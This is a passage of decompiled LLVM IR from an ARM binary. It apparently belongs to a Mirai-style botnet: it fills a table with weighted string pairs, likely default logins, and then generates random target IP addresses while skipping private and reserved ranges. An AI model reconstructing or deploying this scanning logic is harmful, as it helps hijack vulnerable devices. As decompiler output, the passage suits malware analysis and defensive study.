  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15f74.151 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_e740 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint ([5 x i8]* @global_var_15f74.151 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15f7c.153 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e750 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint ([9 x i8]* @global_var_15f7c.153 to i32), i32 12)
  store i32 ptrtoint ([7 x i8]* @global_var_15f88.155 to i32), i32* %r0.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_15f88.155 to i32), i32* %r1.global-to-local, align 4
  %v5_e760 = call i32 @function_e3cc(i32 ptrtoint ([7 x i8]* @global_var_15f88.155 to i32), i32 ptrtoint ([7 x i8]* @global_var_15f88.155 to i32), i32 12)
  store i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15f70.147 to i32), i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v4_e770 = call i32 @function_e3cc(i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32 ptrtoint (i32* @global_var_15f70.147 to i32), i32 7)
  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_15f98.159 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_e780 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint ([9 x i8]* @global_var_15f98.159 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_15fa4.161 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15fa4.161 to i32), i32* %r1.global-to-local, align 4
  %v5_e790 = call i32 @function_e3cc(i32 ptrtoint ([6 x i8]* @global_var_15fa4.161 to i32), i32 ptrtoint ([6 x i8]* @global_var_15fa4.161 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15fac.163 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7a0 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint ([6 x i8]* @global_var_15fac.163 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_15fb4.165 to i32), i32* %r0.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15fb4.165 to i32), i32* %r1.global-to-local, align 4
  %v5_e7b0 = call i32 @function_e3cc(i32 ptrtoint ([8 x i8]* @global_var_15fb4.165 to i32), i32 ptrtoint ([8 x i8]* @global_var_15fb4.165 to i32), i32 14)
  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  %v5_e7c0 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32 11)
  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15fbc.167 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_e7d0 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint (i32* @global_var_15fbc.167 to i32), i32 17)
  store i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15fcc.169 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e7e0 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15f6c.149 to i32), i32 ptrtoint ([6 x i8]* @global_var_15fcc.169 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_15fd4.171 to i32), i32* %r0.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_15fd4.171 to i32), i32* %r1.global-to-local, align 4
  %v5_e7f0 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15fd4.171 to i32), i32 ptrtoint ([5 x i8]* @global_var_15fd4.171 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_15fd4.171 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_15fcc.169 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_e800 = call i32 @function_e3cc(i32 ptrtoint ([5 x i8]* @global_var_15fd4.171 to i32), i32 ptrtoint ([6 x i8]* @global_var_15fcc.169 to i32), i32 9)
  store i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15fdc.173 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e810 = call i32 @function_e3cc(i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32 ptrtoint (i32* @global_var_15fdc.173 to i32), i32 15)
  store i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_15fe8.175 to i32), i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v4_e820 = call i32 @function_e3cc(i32 ptrtoint ([8 x i8]* @global_var_15f90.157 to i32), i32 ptrtoint (i32* @global_var_15fe8.175 to i32), i32 15)
  store i32 %v4_e820, i32* %r0.global-to-local, align 4
  %v2_e828 = ptrtoint i32* %stack_var_-1866 to i32
  %v1_eb54 = add i32 %v2_e828, 20
  %v1_eba8 = add i32 %v2_e828, 16
  %v2_eba8 = inttoptr i32 %v1_eba8 to i32*
  %v1_ebbc = add i32 %v2_e828, 9
  %v2_ebbc = inttoptr i32 %v1_ebbc to i8*
  %v1_ec50 = add i32 %v2_e828, 12
  %v2_ec50 = inttoptr i32 %v1_ec50 to i32*
  %v2_ee34 = ptrtoint i32* %stack_var_-40 to i32
  %v2_ee7c = ptrtoint i32* %stack_var_-68 to i32
  %v2_ee80 = ptrtoint i32* %stack_var_-224 to i32
  %v2_ee84 = ptrtoint i32* %stack_var_-352 to i32
  %v2_f858 = ptrtoint i32* %stack_var_-45 to i32
  %v2_f86c = ptrtoint i32* %stack_var_-77 to i32
  %v2_f7c4 = ptrtoint i32* %stack_var_-60 to i32
  %v2_f980 = ptrtoint i32* %stack_var_-104 to i32
  %v2_e850 = ptrtoint i32* %stack_var_-96 to i32
  br label %dec_label_pc_e830

dec_label_pc_e830:                                ; preds = %dec_label_pc_f018, %dec_label_pc_e694
  %stack_var_-1876.0 = phi i32 [ %tmp334, %dec_label_pc_e694 ], [ %stack_var_-1876.1, %dec_label_pc_f018 ]
  store i32 ptrtoint (i32* @global_var_1e74c.119 to i32), i32* %r0.global-to-local, align 4
  store i32 %stack_var_-1876.0, i32* %r1.global-to-local, align 4
  %v2_e838 = load i32, i32* @global_var_1e74c.119, align 4
  store i32 %v2_e838, i32* @r4, align 4
  %v3_e83c = icmp uge i32 %stack_var_-1876.0, %v2_e838
  store i1 %v3_e83c, i1* %cpsr_c.global-to-local, align 1
  %v9_e83c = icmp eq i32 %stack_var_-1876.0, %v2_e838
  store i1 %v9_e83c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e83c, label %dec_label_pc_eb44, label %dec_label_pc_e844

dec_label_pc_e844:                                ; preds = %dec_label_pc_e830
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  br label %dec_label_pc_e854

dec_label_pc_e854:                                ; preds = %bb407, %dec_label_pc_e844
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-96, align 4
  %v0_e868 = call i32 @function_e094()
  %v1_e868 = trunc i32 %v0_e868 to i16
  store i32 %v0_e868, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20780.45 to i32), i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1e71c.135 to i32), i32* %ip.global-to-local, align 4
  %v2_e874 = load i32, i32* @global_var_20780.45, align 4
  store i32 %v2_e874, i32* %r3.global-to-local, align 4
  store i16 %v1_e868, i16* bitcast (i32* @global_var_1e720.140 to i16*), align 4
  store i32 %v2_e874, i32* @global_var_1e728.176, align 4
  br label %dec_label_pc_e880

dec_label_pc_e880:                                ; preds = %dec_label_pc_e9d8, %dec_label_pc_e8b0, %dec_label_pc_ea0c, %dec_label_pc_ea00, %dec_label_pc_e9f4, %dec_label_pc_e9e8, %.thread48, %.thread32, %.thread28, %.thread24, %bb398, %bb397, %bb396, %bb395, %bb394, %bb393, %bb392, %bb391, %bb390, %bb389, %dec_label_pc_e94c, %dec_label_pc_e944, %bb383, %dec_label_pc_e914, %dec_label_pc_e8f0, %bb376, %dec_label_pc_e8c0, %bb375, %dec_label_pc_e8a8, %bb374, %bb400, %dec_label_pc_e854
  %v0_e880 = call i32 @function_e094()
  store i32 %v0_e880, i32* %r0.global-to-local, align 4
  %v1_e884 = urem i32 %v0_e880, 256
  store i32 %v1_e884, i32* %r1.global-to-local, align 4
  %v3_e888 = udiv i32 %v0_e880, 256
  store i32 %v3_e888, i32* %r3.global-to-local, align 4
  %v3_e88c = udiv i32 %v0_e880, 65536
  store i32 %v3_e88c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e890 = icmp eq i32 %v1_e884, 0
  store i1 %v2_e890, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e890, label %bb374, label %bb373

bb373:                                            ; preds = %dec_label_pc_e880
  %v3_e894 = icmp ugt i32 %v1_e884, 126
  store i1 %v3_e894, i1* %cpsr_c.global-to-local, align 1
  %v8_e894 = icmp eq i32 %v1_e884, 127
  store i1 %v8_e894, i1* %cpsr_z.global-to-local, align 1
  br label %bb374

bb374:                                            ; preds = %dec_label_pc_e880, %bb373
  %v0_e8a4 = phi i1 [ true, %dec_label_pc_e880 ], [ %v8_e894, %bb373 ]
  %v1_e898 = urem i32 %v3_e888, 256
  store i32 %v1_e898, i32* %ip.global-to-local, align 4
  %v1_e89c = urem i32 %v3_e88c, 256
  store i32 %v1_e89c, i32* %r2.global-to-local, align 4
  %v1_e8a0 = and i32 %v0_e880, 8388608
  %v2_e8a0 = icmp ne i32 %v1_e8a0, 0
  store i1 %v2_e8a0, i1* %cpsr_c.global-to-local, align 1
  %v3_e8a0 = udiv i32 %v0_e880, 16777216
  store i32 %v3_e8a0, i32* %r0.global-to-local, align 4
  br i1 %v0_e8a4, label %dec_label_pc_e880, label %dec_label_pc_e8a8

dec_label_pc_e8a8:                                ; preds = %bb374
  %v2_e8a8 = icmp ugt i32 %v1_e884, 2
  store i1 %v2_e8a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8a8 = icmp eq i32 %v1_e884, 3
  store i1 %v7_e8a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8a8, label %dec_label_pc_e880, label %dec_label_pc_e8b0

dec_label_pc_e8b0:                                ; preds = %dec_label_pc_e8a8
  %v1_e8b0 = add nsw i32 %v1_e884, -15
  store i32 %v1_e8b0, i32* %r3.global-to-local, align 4
  %v2_e8b4 = icmp ugt i32 %v1_e884, 55
  store i1 %v2_e8b4, i1* %cpsr_c.global-to-local, align 1
  %v7_e8b4 = icmp eq i32 %v1_e884, 56
  store i1 %v7_e8b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8b4, label %dec_label_pc_e880, label %bb375

bb375:                                            ; preds = %dec_label_pc_e8b0
  %v3_e8b8 = icmp ne i32 %v1_e8b0, 0
  store i1 %v3_e8b8, i1* %cpsr_c.global-to-local, align 1
  %v8_e8b8 = icmp eq i32 %v1_e8b0, 1
  store i1 %v8_e8b8, i1* %cpsr_z.global-to-local, align 1
  %v2_e8bc = xor i1 %v3_e8b8, true
  %v3_e8bc = or i1 %v8_e8b8, %v2_e8bc
  br i1 %v3_e8bc, label %dec_label_pc_e880, label %dec_label_pc_e8c0

dec_label_pc_e8c0:                                ; preds = %bb375
  %v2_e8c0 = icmp ugt i32 %v1_e884, 9
  store i1 %v2_e8c0, i1* %cpsr_c.global-to-local, align 1
  %v7_e8c0 = icmp eq i32 %v1_e884, 10
  store i1 %v7_e8c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8c0, label %dec_label_pc_e880, label %dec_label_pc_e8c8

dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e8c0
  %v2_e8c8 = icmp ugt i32 %v1_e884, 191
  store i1 %v2_e8c8, i1* %cpsr_c.global-to-local, align 1
  %v7_e8c8 = icmp eq i32 %v1_e884, 192
  store i1 %v7_e8c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e8c8, label %bb376, label %dec_label_pc_e8d4

bb376:                                            ; preds = %dec_label_pc_e8c8
  %v3_e8cc = icmp ugt i32 %v1_e898, 167
  store i1 %v3_e8cc, i1* %cpsr_c.global-to-local, align 1
  %v8_e8cc = icmp eq i32 %v1_e898, 168
  store i1 %v8_e8cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e8cc, label %dec_label_pc_e880, label %dec_label_pc_e8d4

dec_label_pc_e8d4:                                ; preds = %dec_label_pc_e8c8, %bb376
  %v7_e8d4 = icmp eq i32 %v1_e884, 172
  %.461 = zext i1 %v7_e8d4 to i32
  store i32 %.461, i32* %r3.global-to-local, align 4
  %v2_e8e0 = icmp ugt i32 %v1_e898, 14
  store i1 %v2_e8e0, i1* %cpsr_c.global-to-local, align 1
  %v7_e8e0 = icmp eq i32 %v1_e898, 15
  store i1 %v7_e8e0, i1* %cpsr_z.global-to-local, align 1
  %v2_e8e4 = xor i1 %v2_e8e0, true
  %v3_e8e4 = or i1 %v7_e8e0, %v2_e8e4
  br i1 %v3_e8e4, label %.thread8, label %bb379

.thread8:                                         ; preds = %dec_label_pc_e8d4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e8f8

bb379:                                            ; preds = %dec_label_pc_e8d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e8e8 = icmp eq i1 %v7_e8d4, false
  store i1 %v2_e8e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e8e8, label %dec_label_pc_e8f8, label %dec_label_pc_e8f0

dec_label_pc_e8f0:                                ; preds = %bb379
  %v2_e8f0 = icmp ugt i32 %v1_e898, 30
  store i1 %v2_e8f0, i1* %cpsr_c.global-to-local, align 1
  %v7_e8f0 = icmp eq i32 %v1_e898, 31
  store i1 %v7_e8f0, i1* %cpsr_z.global-to-local, align 1
  %v2_e8f4 = xor i1 %v2_e8f0, true
  %v3_e8f4 = or i1 %v7_e8f0, %v2_e8f4
  br i1 %v3_e8f4, label %dec_label_pc_e880, label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %.thread8, %dec_label_pc_e8f0, %bb379
  %v7_e8f8 = icmp eq i32 %v1_e884, 100
  %.462 = zext i1 %v7_e8f8 to i32
  store i32 %.462, i32* %r3.global-to-local, align 4
  %v2_e904 = icmp ugt i32 %v1_e898, 62
  store i1 %v2_e904, i1* %cpsr_c.global-to-local, align 1
  %v7_e904 = icmp eq i32 %v1_e898, 63
  store i1 %v7_e904, i1* %cpsr_z.global-to-local, align 1
  %v2_e908 = xor i1 %v2_e904, true
  %v3_e908 = or i1 %v7_e904, %v2_e908
  br i1 %v3_e908, label %.thread13, label %bb382

.thread13:                                        ; preds = %dec_label_pc_e8f8
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e91c

bb382:                                            ; preds = %dec_label_pc_e8f8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e90c = icmp eq i1 %v7_e8f8, false
  store i1 %v2_e90c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e90c, label %dec_label_pc_e91c, label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %bb382
  %v2_e914 = icmp ugt i32 %v1_e898, 125
  store i1 %v2_e914, i1* %cpsr_c.global-to-local, align 1
  %v7_e914 = icmp eq i32 %v1_e898, 126
  store i1 %v7_e914, i1* %cpsr_z.global-to-local, align 1
  %v2_e918 = xor i1 %v2_e914, true
  %v3_e918 = or i1 %v7_e914, %v2_e918
  br i1 %v3_e918, label %dec_label_pc_e880, label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %.thread13, %dec_label_pc_e914, %bb382
  %v2_e91c = icmp ugt i32 %v1_e884, 168
  store i1 %v2_e91c, i1* %cpsr_c.global-to-local, align 1
  %v7_e91c = icmp eq i32 %v1_e884, 169
  store i1 %v7_e91c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e91c, label %bb383, label %dec_label_pc_e928

bb383:                                            ; preds = %dec_label_pc_e91c
  %v3_e920 = icmp eq i32 %v1_e898, 255
  store i1 %v3_e920, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e920, label %dec_label_pc_e880, label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %dec_label_pc_e91c, %bb383
  %v7_e928 = icmp eq i32 %v1_e884, 198
  %.463 = zext i1 %v7_e928 to i32
  store i32 %.463, i32* %r3.global-to-local, align 4
  %v2_e934 = icmp ugt i32 %v1_e898, 16
  store i1 %v2_e934, i1* %cpsr_c.global-to-local, align 1
  %v7_e934 = icmp eq i32 %v1_e898, 17
  store i1 %v7_e934, i1* %cpsr_z.global-to-local, align 1
  %v2_e938 = xor i1 %v2_e934, true
  %v3_e938 = or i1 %v7_e934, %v2_e938
  br i1 %v3_e938, label %.thread19, label %bb386

.thread19:                                        ; preds = %dec_label_pc_e928
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e94c

bb386:                                            ; preds = %dec_label_pc_e928
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e93c = icmp eq i1 %v7_e928, false
  store i1 %v2_e93c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e93c, label %dec_label_pc_e94c, label %dec_label_pc_e944

dec_label_pc_e944:                                ; preds = %bb386
  %v2_e944 = icmp ugt i32 %v1_e898, 18
  store i1 %v2_e944, i1* %cpsr_c.global-to-local, align 1
  %v7_e944 = icmp eq i32 %v1_e898, 19
  store i1 %v7_e944, i1* %cpsr_z.global-to-local, align 1
  %v2_e948 = xor i1 %v2_e944, true
  %v3_e948 = or i1 %v7_e944, %v2_e948
  br i1 %v3_e948, label %dec_label_pc_e880, label %dec_label_pc_e94c

dec_label_pc_e94c:                                ; preds = %.thread19, %dec_label_pc_e944, %bb386
  %v2_e94c = icmp ugt i32 %v1_e884, 222
  store i1 %v2_e94c, i1* %cpsr_c.global-to-local, align 1
  %v7_e94c = icmp eq i32 %v1_e884, 223
  store i1 %v7_e94c, i1* %cpsr_z.global-to-local, align 1
  %v2_e950 = xor i1 %v7_e94c, true
  %v3_e950 = and i1 %v2_e94c, %v2_e950
  br i1 %v3_e950, label %dec_label_pc_e880, label %dec_label_pc_e954

dec_label_pc_e954:                                ; preds = %dec_label_pc_e94c
  %v7_e954 = icmp eq i32 %v1_e884, 106
  %.464 = zext i1 %v7_e954 to i32
  %v2_e960 = icmp ugt i32 %v1_e898, 185
  store i1 %v2_e960, i1* %cpsr_c.global-to-local, align 1
  %v7_e960 = icmp eq i32 %v1_e898, 186
  store i1 %v7_e960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e960, label %bb389, label %dec_label_pc_e96c

bb389:                                            ; preds = %dec_label_pc_e954
  %v2_e954 = icmp ugt i32 %v1_e884, 105
  store i1 %v2_e954, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e954, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e954, label %dec_label_pc_e880, label %dec_label_pc_e96c

dec_label_pc_e96c:                                ; preds = %dec_label_pc_e954, %bb389
  %v2_e96c = icmp ugt i32 %v1_e898, 186
  store i1 %v2_e96c, i1* %cpsr_c.global-to-local, align 1
  %v7_e96c = icmp eq i32 %v1_e898, 187
  store i1 %v7_e96c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e96c, label %.thread24, label %.thread25

.thread25:                                        ; preds = %dec_label_pc_e96c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e980

.thread24:                                        ; preds = %dec_label_pc_e96c
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e978 = icmp eq i1 %v7_e954, false
  store i1 %v2_e978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e978, label %dec_label_pc_e980, label %dec_label_pc_e880

dec_label_pc_e980:                                ; preds = %.thread25, %.thread24
  %v2_e980 = icmp ugt i32 %v1_e898, 184
  store i1 %v2_e980, i1* %cpsr_c.global-to-local, align 1
  %v7_e980 = icmp eq i32 %v1_e898, 185
  store i1 %v7_e980, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e980, label %.thread28, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_e980
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e994

.thread28:                                        ; preds = %dec_label_pc_e980
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e98c = icmp eq i1 %v7_e954, false
  store i1 %v2_e98c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e98c, label %dec_label_pc_e994, label %dec_label_pc_e880

dec_label_pc_e994:                                ; preds = %.thread29, %.thread28
  %v2_e994 = icmp ugt i32 %v1_e898, 183
  store i1 %v2_e994, i1* %cpsr_c.global-to-local, align 1
  %v7_e994 = icmp eq i32 %v1_e898, 184
  store i1 %v7_e994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e994, label %.thread32, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_e994
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e9a8

.thread32:                                        ; preds = %dec_label_pc_e994
  store i32 %.464, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e9a0 = icmp eq i1 %v7_e954, false
  store i1 %v2_e9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e9a0, label %dec_label_pc_e9a8, label %dec_label_pc_e880

dec_label_pc_e9a8:                                ; preds = %.thread33, %.thread32
  %v2_e9a8 = icmp ugt i32 %v1_e884, 149
  store i1 %v2_e9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a8 = icmp eq i32 %v1_e884, 150
  store i1 %v7_e9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9a8, label %bb390, label %dec_label_pc_e9b4

bb390:                                            ; preds = %dec_label_pc_e9a8
  %v3_e9ac = icmp ugt i32 %v1_e898, 30
  store i1 %v3_e9ac, i1* %cpsr_c.global-to-local, align 1
  %v8_e9ac = icmp eq i32 %v1_e898, 31
  store i1 %v8_e9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9ac, label %dec_label_pc_e880, label %dec_label_pc_e9b4

dec_label_pc_e9b4:                                ; preds = %dec_label_pc_e9a8, %bb390
  %v2_e9b4 = icmp ugt i32 %v1_e884, 48
  store i1 %v2_e9b4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b4 = icmp eq i32 %v1_e884, 49
  store i1 %v7_e9b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b4, label %bb391, label %dec_label_pc_e9c0

bb391:                                            ; preds = %dec_label_pc_e9b4
  %v3_e9b8 = icmp ugt i32 %v1_e898, 50
  store i1 %v3_e9b8, i1* %cpsr_c.global-to-local, align 1
  %v8_e9b8 = icmp eq i32 %v1_e898, 51
  store i1 %v8_e9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9b8, label %dec_label_pc_e880, label %dec_label_pc_e9c0

dec_label_pc_e9c0:                                ; preds = %dec_label_pc_e9b4, %bb391
  %v2_e9c0 = icmp ugt i32 %v1_e884, 177
  store i1 %v2_e9c0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9c0 = icmp eq i32 %v1_e884, 178
  store i1 %v7_e9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9c0, label %bb392, label %dec_label_pc_e9cc

bb392:                                            ; preds = %dec_label_pc_e9c0
  %v3_e9c4 = icmp ugt i32 %v1_e898, 61
  store i1 %v3_e9c4, i1* %cpsr_c.global-to-local, align 1
  %v8_e9c4 = icmp eq i32 %v1_e898, 62
  store i1 %v8_e9c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9c4, label %dec_label_pc_e880, label %dec_label_pc_e9cc

dec_label_pc_e9cc:                                ; preds = %dec_label_pc_e9c0, %bb392
  %v2_e9cc = icmp ugt i32 %v1_e884, 159
  store i1 %v2_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9cc = icmp eq i32 %v1_e884, 160
  store i1 %v7_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9cc, label %bb393, label %dec_label_pc_e9d8

bb393:                                            ; preds = %dec_label_pc_e9cc
  %v3_e9d0 = icmp ugt i32 %v1_e898, 12
  store i1 %v3_e9d0, i1* %cpsr_c.global-to-local, align 1
  %v8_e9d0 = icmp eq i32 %v1_e898, 13
  store i1 %v8_e9d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9d0, label %dec_label_pc_e880, label %dec_label_pc_e9d8

dec_label_pc_e9d8:                                ; preds = %dec_label_pc_e9cc, %bb393
  %v1_e9d8 = add nsw i32 %v1_e884, -6
  store i32 %v1_e9d8, i32* %r3.global-to-local, align 4
  %v2_e9dc = icmp ugt i32 %v1_e884, 10
  store i1 %v2_e9dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9dc = icmp eq i32 %v1_e884, 11
  store i1 %v7_e9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9dc, label %dec_label_pc_e880, label %bb394

bb394:                                            ; preds = %dec_label_pc_e9d8
  %v3_e9e0 = icmp ne i32 %v1_e9d8, 0
  store i1 %v3_e9e0, i1* %cpsr_c.global-to-local, align 1
  %v8_e9e0 = icmp eq i32 %v1_e9d8, 1
  store i1 %v8_e9e0, i1* %cpsr_z.global-to-local, align 1
  %v2_e9e4 = xor i1 %v3_e9e0, true
  %v3_e9e4 = or i1 %v8_e9e0, %v2_e9e4
  br i1 %v3_e9e4, label %dec_label_pc_e880, label %dec_label_pc_e9e8

dec_label_pc_e9e8:                                ; preds = %bb394
  %v2_e9e8 = icmp ugt i32 %v1_e884, 21
  store i1 %v2_e9e8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e8 = icmp eq i32 %v1_e884, 22
  store i1 %v7_e9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e8, label %dec_label_pc_e880, label %bb395

bb395:                                            ; preds = %dec_label_pc_e9e8
  %v3_e9ec = icmp ugt i32 %v1_e884, 20
  store i1 %v3_e9ec, i1* %cpsr_c.global-to-local, align 1
  %v8_e9ec = icmp eq i32 %v1_e884, 21
  store i1 %v8_e9ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9ec, label %dec_label_pc_e880, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %bb395
  %v2_e9f4 = icmp ugt i32 %v1_e884, 27
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i32 %v1_e884, 28
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %dec_label_pc_e880, label %bb396

bb396:                                            ; preds = %dec_label_pc_e9f4
  %v3_e9f8 = icmp ugt i32 %v1_e884, 25
  store i1 %v3_e9f8, i1* %cpsr_c.global-to-local, align 1
